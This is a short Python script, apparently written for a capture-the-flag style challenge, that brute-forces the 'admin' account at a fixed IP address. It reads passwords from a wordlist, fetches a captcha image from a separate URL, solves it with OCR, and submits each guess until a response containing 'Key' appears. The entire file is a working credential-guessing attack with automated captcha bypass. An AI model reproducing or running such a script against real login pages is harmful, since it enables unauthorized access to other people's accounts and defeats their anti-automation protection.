#coding=utf8
from PIL import Image
from pytesser import image_to_string
import requests
import time
PATH ="vcode.png"
r = requests.Session()
for p in open('pass.txt','r').readlines():
   while True:
      try:
          with open(PATH,'wb') as f:
            f.write(r.get("http://www.myhostadmin.net/code6.asp?r=%s"%time.time()).content)
            f.close()
          code = image_to_string(Image.open(PATH)).strip()
          if len(code)==0:
           continue
          else:
            data={'user':'admin','password':p[:-1],'vcode':code,'submit':'Login'}
            print data
            req = r.post("http://104.224.169.128/tasks/wcode2.php",data=data).content
            print req
            if 'Vcode' in req:
                continue
            if 'password' in req:
                break
            if 'Key' in req:
                raise Exception(req)
      except Exception as e:
          print(e)
          continue


